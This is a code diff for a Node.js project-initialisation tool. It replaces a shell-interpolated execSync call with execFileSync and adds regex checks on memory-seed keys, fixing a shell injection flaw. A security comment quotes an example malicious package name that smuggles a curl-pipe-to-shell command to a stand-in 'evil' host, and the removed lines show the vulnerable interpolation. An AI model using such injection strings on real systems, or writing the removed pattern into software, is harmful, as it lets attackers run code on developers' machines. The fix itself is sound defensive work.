@@ -9,7 +9,7 @@
 import * as fs from 'node:fs';
 import * as path from 'node:path';
 import * as os from 'node:os';
-import { execSync } from 'node:child_process';
+import { execFileSync } from 'node:child_process';
 import type { InitResult } from './types.js';
 
 // ── Project Profile ───────────────────────────────────────────────────────────
@@ -594,12 +594,28 @@ export function writeSharedInstructions(
     fs.writeFileSync(siPath, content, 'utf-8');
     result.created.files.push('.agents/shared_instructions.md');
 
-    // Seed memory (best-effort, non-blocking)
+    // Seed memory (best-effort, non-blocking).
+    // SECURITY: previously the seed.key (built from package.json `name`) was
+    // interpolated into a shell command via execSync. A malicious package.json
+    // with a name like `x"; curl evil | sh; #` produced shell injection during
+    // `monomind init`. Switch to execFileSync (array argv, no shell) and
+    // reject seed inputs that don't match a tight regex.
+    const KEY_RE = /^[a-zA-Z0-9._:/-]{1,128}$/;
+    const NS_RE = /^[a-zA-Z0-9_-]{1,64}$/;
     const seeds = generateMemorySeeds(profile);
     for (const seed of seeds) {
+      if (!KEY_RE.test(seed.key) || !NS_RE.test(seed.namespace) || typeof seed.value !== 'string') {
+        continue;
+      }
       try {
-        execSync(
-          `npx --yes monomind@latest memory store --key "${seed.key}" --value ${JSON.stringify(seed.value)} --namespace ${seed.namespace}`,
+        execFileSync(
+          'npx',
+          [
+            '--yes', 'monomind@latest', 'memory', 'store',
+            '--key', seed.key,
+            '--value', seed.value,
+            '--namespace', seed.namespace,
+          ],
           { cwd, stdio: 'ignore', timeout: 8000 },
         );
       } catch {
